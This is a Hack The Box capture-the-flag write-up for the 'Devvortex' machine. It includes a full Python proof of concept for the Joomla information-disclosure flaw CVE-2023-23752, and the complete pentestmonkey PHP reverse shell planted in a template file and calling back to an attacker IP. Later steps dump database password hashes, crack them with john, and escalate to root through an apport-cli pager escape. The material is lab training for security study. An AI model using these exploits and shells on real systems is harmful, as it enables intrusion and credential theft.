---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - Dirb
  - CVE-2023-23752
  - Joomla
  - apport-cli
  - CVE-2023-1326
---
# Overview

| Name        | Devvortex |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -T4 10.129.229.146
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-17 02:12 CDT
Nmap scan report for 10.129.229.146
Host is up (0.079s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Site is static.
# Enumeration
## Vhost fuzzing

```bash
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb' -fs 154

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 158ms]
```

Add `dev.devvortex.htb` to hosts file.

![[devvortex.png]]
## Dirb

```bash
$ dirb http://dev.devvortex.htb

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Oct 17 02:17:34 2025
URL_BASE: http://dev.devvortex.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://dev.devvortex.htb/ ----
==> DIRECTORY: http://dev.devvortex.htb/administrator/                                                                               
==> DIRECTORY: http://dev.devvortex.htb/api/            
<SNIP>
```

Go to `/administrator` and we see Joomla site.

![[devvortex 1.png]]
# Initial Foothold

Go here `http://dev.devvortex.htb/administrator/manifests/files/joomla.xml` and we get version of Joomla `4.2.6`.
## [CVE-2023–23752](https://github.com/0x0jr/HTB-Devvortex-CVE-2023-2375-PoC)

```bash
$ cat exploit.py
#!/usr/bin/python3
# usage: python3 exploit.py http://<url>
# 0xjr: join the discord, link in github bio

import requests
import sys
from colorama import Fore, init
import json
from urllib.parse import urljoin

init(autoreset=True)

# banner
banner = """
       __                      __      __
      / /___  ____  ____ ___  / /___ _/ /
 __  / / __ \/ __ \/ __ `__ \/ / __ `/ / 
/ /_/ / /_/ / /_/ / / / / / / / /_/ /_/  
\____/\____/\____/_/ /_/ /_/_/\__,_(_)   

PoC By: 0xjr
Join the discord! Link in my github bio!
"""

print(f"{Fore.BLUE}{banner}")

def get_url(base_url):
    try:
        api_path = "/api/index.php/v1/config/application?public=true"
        url = urljoin(base_url, api_path)
        print(f"{Fore.BLUE}[~] Info: Trying, {url}.")
        response = requests.get(url)
        response.raise_for_status()
        
        data = response.json()
        
        def find_keys(node, keys):
            if isinstance(node, dict):
                for k, v in node.items():
                    if k in keys:
                        keys[k] = v
                    if isinstance(v, (dict, list)):
                        find_keys(v, keys)
            elif isinstance(node, list):
                for item in node:
                    find_keys(item, keys)

        keys = {"user": None, "password": None}
        find_keys(data, keys)

        if keys["user"] and keys["password"]:
            print(f"{Fore.GREEN}[+] Success: Found username: {keys['user']}")
            print(f"{Fore.GREEN}[+] Success: Found password: {keys['password']}")
        else:
            print(f"{Fore.YELLOW}[!] Warning: Sensitive information not found in the response.")

    except requests.ConnectionError as e:
        print(f"{Fore.RED}[-] Error: {e}")
    except requests.HTTPError as e:
        print(f"{Fore.RED}[-] HTTP Error: {e}")
    except json.JSONDecodeError as e:
        print(f"{Fore.RED}[-] JSON Decode Error: {e}")
    except Exception as e:
        print(f"{Fore.RED}[-] An unexpected error occurred: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"{Fore.RED}[-] Usage: python3 {sys.argv[0]} http://<url>")
        sys.exit(1)

    base_url = sys.argv[1]
    get_url(base_url)
```

```bash
$ python3 exploit.py http://dev.devvortex.htb/

       __                      __      __
      / /___  ____  ____ ___  / /___ _/ /
 __  / / __ \/ __ \/ __ `__ \/ / __ `/ / 
/ /_/ / /_/ / /_/ / / / / / / / /_/ /_/  
\____/\____/\____/_/ /_/ /_/_/\__,_(_)   

PoC By: 0xjr
Join the discord! Link in my github bio!

[~] Info: Trying, http://dev.devvortex.htb/api/index.php/v1/config/application?public=true.
[+] Success: Found username: lewis
[+] Success: Found password: P4ntherg0t1n5r3c0n##
```

Login in to Joomla with those creds.

![[devvortex2.png]]

Remove `error.php` content and change it to this:

```php
<?php  
// php-reverse-shell - A Reverse Shell implementation in PHP  
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net  
//  
// This tool may be used for legal purposes only. Users take full responsibility  
// for any actions performed using this tool. The author accepts no liability  
// for damage caused by this tool. If these terms are not acceptable to you, then  
// do not use this tool.  
//  
// In all other respects the GPL version 2 applies:  
//  
// This program is free software; you can redistribute it and/or modify  
// it under the terms of the GNU General Public License version 2 as  
// published by the Free Software Foundation.  
//  
// This program is distributed in the hope that it will be useful,  
// but WITHOUT ANY WARRANTY; without even the implied warranty of  
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the  
// GNU General Public License for more details.  
//  
// You should have received a copy of the GNU General Public License along  
// with this program; if not, write to the Free Software Foundation, Inc.,  
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.  
//  
// This tool may be used for legal purposes only. Users take full responsibility  
// for any actions performed using this tool. If these terms are not acceptable to  
// you, then do not use this tool.  
//  
// You are encouraged to send comments, improvements or suggestions to  
// me at pentestmonkey@pentestmonkey.net  
//  
// Description  
// -----------  
// This script will make an outbound TCP connection to a hardcoded IP and port.  
// The recipient will be given a shell running as the current user (apache normally).  
//  
// Limitations  
// -----------  
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+  
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.  
// Some compile-time options are needed for daemonisation (like pcntl, posix). These are rarely available.  
//  
// Usage  
// -----  
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.  
  
set_time_limit (0);  
$VERSION = "1.0";  
$ip = '10.10.14.122'; // CHANGE THIS  
$port = 4444; // CHANGE THIS  
$chunk_size = 1400;  
$write_a = null;  
$error_a = null;  
$shell = 'uname -a; w; id; /bin/sh -i';  
$daemon = 0;  
$debug = 0;  
  
//  
// Daemonise ourself if possible to avoid zombies later  
//  
  
// pcntl_fork is hardly ever available, but will allow us to daemonise  
// our php process and avoid zombies. Worth a try...  
if (function_exists('pcntl_fork')) {  
// Fork and have the parent process exit  
$pid = pcntl_fork();  
  
if ($pid == -1) {  
printit("ERROR: Can't fork");  
exit(1);  
}  
  
if ($pid) {  
exit(0); // Parent exits  
}  
  
// Make the current process a session leader  
// Will only succeed if we forked  
if (posix_setsid() == -1) {  
printit("Error: Can't setsid()");  
exit(1);  
}  
  
$daemon = 1;  
} else {  
printit("WARNING: Failed to daemonise. This is quite common and not fatal.");  
}  
  
// Change to a safe directory  
chdir("/");  
  
// Remove any umask we inherited  
umask(0);  
  
//  
// Do the reverse shell...  
//  
  
// Open reverse connection  
$sock = fsockopen($ip, $port, $errno, $errstr, 30);  
if (!$sock) {  
printit("$errstr ($errno)");  
exit(1);  
}  
  
// Spawn shell process  
$descriptorspec = array(  
0 => array("pipe", "r"), // stdin is a pipe that the child will read from  
1 => array("pipe", "w"), // stdout is a pipe that the child will write to  
2 => array("pipe", "w") // stderr is a pipe that the child will write to  
);  
  
$process = proc_open($shell, $descriptorspec, $pipes);  
  
if (!is_resource($process)) {  
printit("ERROR: Can't spawn shell");  
exit(1);  
}  
  
// Set everything to non-blocking  
// Reason: Occsionally reads will block, even though stream_select tells us they won't  
stream_set_blocking($pipes[0], 0);  
stream_set_blocking($pipes[1], 0);  
stream_set_blocking($pipes[2], 0);  
stream_set_blocking($sock, 0);  
  
printit("Successfully opened reverse shell to $ip:$port");  
  
while (1) {  
// Check for end of TCP connection  
if (feof($sock)) {  
printit("ERROR: Shell connection terminated");  
break;  
}  
  
// Check for end of STDOUT  
if (feof($pipes[1])) {  
printit("ERROR: Shell process terminated");  
break;  
}  
  
// Wait until a command is end down $sock, or some  
// command output is available on STDOUT or STDERR  
$read_a = array($sock, $pipes[1], $pipes[2]);  
$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);  
  
// If we can read from the TCP socket, send  
// data to process's STDIN  
if (in_array($sock, $read_a)) {  
if ($debug) printit("SOCK READ");  
$input = fread($sock, $chunk_size);  
if ($debug) printit("SOCK: $input");  
fwrite($pipes[0], $input);  
}  
  
// If we can read from the process's STDOUT  
// send data down tcp connection  
if (in_array($pipes[1], $read_a)) {  
if ($debug) printit("STDOUT READ");  
$input = fread($pipes[1], $chunk_size);  
if ($debug) printit("STDOUT: $input");  
fwrite($sock, $input);  
}  
  
// If we can read from the process's STDERR  
// send data down tcp connection  
if (in_array($pipes[2], $read_a)) {  
if ($debug) printit("STDERR READ");  
$input = fread($pipes[2], $chunk_size);  
if ($debug) printit("STDERR: $input");  
fwrite($sock, $input);  
}  
}  
  
fclose($sock);  
fclose($pipes[0]);  
fclose($pipes[1]);  
fclose($pipes[2]);  
proc_close($process);  
  
// Like print, but does nothing if we've daemonised ourself  
// (I can't figure out how to redirect STDOUT like a proper daemon)  
function printit ($string) {  
if (!$daemon) {  
print "$string\n";  
}  
}  
  
?>
```

![[devvortex3.png]]

Click in `Save & Close` then trigger it:

```bash
$ curl http://dev.devvortex.htb/templates/cassiopeia/error.php
```

```bash
$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.229.146] 51162
Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 07:31:22 up 20 min,  0 users,  load average: 0.02, 0.11, 0.15
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@devvortex:/$ export TERM=xterm
export TERM=xterm
```

Noticed that MySQL port was open so:

```bash
www-data@devvortex:/$ mysql -u lewis -pP4ntherg0t1n5r3c0n##
mysql -u lewis -pP4ntherg0t1n5r3c0n##
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 470
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla;
use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.01 sec)

mysql> select * from sd4fg_users;
select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2025-10-17 07:27:01 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)
```

Save the hash of `logan` (SSH with `lewis`) wont work.

```bash
$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Created directory: /home/ninjathebox98w1/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?) 
```

Pass of `logan` is `tequieromucho`. Try SSH.

```bash
$ ssh logan@devvortex.htb
The authenticity of host 'devvortex.htb (10.129.229.146)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'devvortex.htb' (ED25519) to the list of known hosts.
logan@devvortex.htb's password: tequieromucho
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 17 Oct 2025 07:37:46 AM UTC

  System load:  0.08              Processes:             164
  Usage of /:   63.6% of 4.76GB   Users logged in:       0
  Memory usage: 16%               IPv4 address for eth0: 10.129.229.146
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb 26 14:44:38 2024 from 10.10.14.23
logan@devvortex:~$ ls
user.txt
logan@devvortex:~$ cat user.txt
0de7fe4ec80fda90aeba9ff4356a9f16
```
# Privilege Escalation

```bash
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```
## [CVE-2023-1326](https://github.com/h3x0v3rl0rd/CVE-2023-1326)

```bash
logan@devvortex:~$ sudo /usr/bin/apport-cli -f

*** What kind of problem do you want to report?


Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C): 1


*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

*** What display problem do you observe?


Choices:
  1: I dont know
  2: Freezes or hangs during boot or usage
  3: Crashes or restarts back to login screen
  4: Resolution is incorrect
  5: Shows screen corruption
  6: Performance is worse than expected
  7: Fonts are the wrong size
  8: Other display-related problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/C): 2

*** 

To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze

Press any key to continue... 

.dpkg-query: no packages found matching xorg
...................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
```

Then just paste this in screen:

```bash
!id
!/bin/bash
```

```bash
uid=0(root) gid=0(root) groups=0(root)
!done  (press RETURN)
root@devvortex:/home/logan# cat /root/root.txt
6a894db0e3e069ebbc65fd2c94531221
```

---